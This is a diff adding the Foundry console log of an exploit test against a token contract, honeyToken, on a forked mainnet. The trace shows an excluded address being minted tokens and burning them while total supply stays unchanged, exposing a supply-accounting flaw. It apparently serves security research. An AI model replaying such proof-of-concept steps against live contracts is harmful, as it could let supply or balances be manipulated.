@@ -1,0 +1,61 @@
+No files changed, compilation skipped
+2026-06-16T12:45:23.426930Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/mainnet/25330165"
+
+Ran 1 test for test/Exploit.t.sol:ExploitTest
+[FAIL: Total supply should decrease by mintAmount: 552040440 != 551940440] testWrongMintAndBurn_ExcludedAccount() (gas: 132986)
+2026-06-16T12:45:31.849315Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:45:31.849697Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:45:31.851748Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:45:31.851764Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:45:31.851776Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+2026-06-16T12:45:31.851788Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x7109709ecfa91a80626ff3989d68f67f5b1dd12d)
+Traces:
+  [37375] ExploitTest::setUp()
+    ├─ [2612] honeyToken::owner() [staticcall]
+    │   └─ ← [Return] Owner: [0x5B21e58c55cF777241b6Ce74c014C12f84fd583f]
+    ├─ [0] VM::label(Attacker: [0x000000000000000000000000000000000000dEaD], "Attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Owner: [0x5B21e58c55cF777241b6Ce74c014C12f84fd583f], "Owner")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [132986] ExploitTest::testWrongMintAndBurn_ExcludedAccount()
+    ├─ [2550] honeyToken::totalSupply() [staticcall]
+    │   └─ ← [Return] 552040440 [5.52e8]
+    ├─ [0] VM::prank(Owner: [0x5B21e58c55cF777241b6Ce74c014C12f84fd583f])
+    │   └─ ← [Return]
+    ├─ [71821] honeyToken::excludeAccount(Attacker: [0x000000000000000000000000000000000000dEaD])
+    │   └─ ← [Stop]
+    ├─ [950] honeyToken::isExcluded(Attacker: [0x000000000000000000000000000000000000dEaD]) [staticcall]
+    │   └─ ← [Return] true
+    ├─ [2527] honeyToken::decimals() [staticcall]
+    │   └─ ← [Return] 2
+    ├─ [0] VM::prank(Owner: [0x5B21e58c55cF777241b6Ce74c014C12f84fd583f])
+    │   └─ ← [Return]
+    ├─ [26779] honeyToken::mint(Attacker: [0x000000000000000000000000000000000000dEaD], 100000 [1e5])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Attacker: [0x000000000000000000000000000000000000dEaD], value: 100000 [1e5])
+    │   └─ ← [Stop]
+    ├─ [3187] honeyToken::balanceOf(Attacker: [0x000000000000000000000000000000000000dEaD]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::prank(Attacker: [0x000000000000000000000000000000000000dEaD])
+    │   └─ ← [Return]
+    ├─ [4142] honeyToken::burn(100000 [1e5])
+    │   ├─ emit Transfer(from: Attacker: [0x000000000000000000000000000000000000dEaD], to: 0x0000000000000000000000000000000000000000, value: 100000 [1e5])
+    │   └─ ← [Stop]
+    ├─ [550] honeyToken::totalSupply() [staticcall]
+    │   └─ ← [Return] 552040440 [5.52e8]
+    ├─ [1187] honeyToken::balanceOf(Attacker: [0x000000000000000000000000000000000000dEaD]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(552040440 [5.52e8], 551940440 [5.519e8], "Total supply should decrease by mintAmount") [staticcall]
+    │   └─ ← [Revert] Total supply should decrease by mintAmount: 552040440 != 551940440
+    └─ ← [Revert] Total supply should decrease by mintAmount: 552040440 != 551940440
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 8.42s (4.96s CPU time)
+
+Ran 1 test suite in 10.69s (8.42s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Exploit.t.sol:ExploitTest
+[FAIL: Total supply should decrease by mintAmount: 552040440 != 551940440] testWrongMintAndBurn_ExcludedAccount() (gas: 132986)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
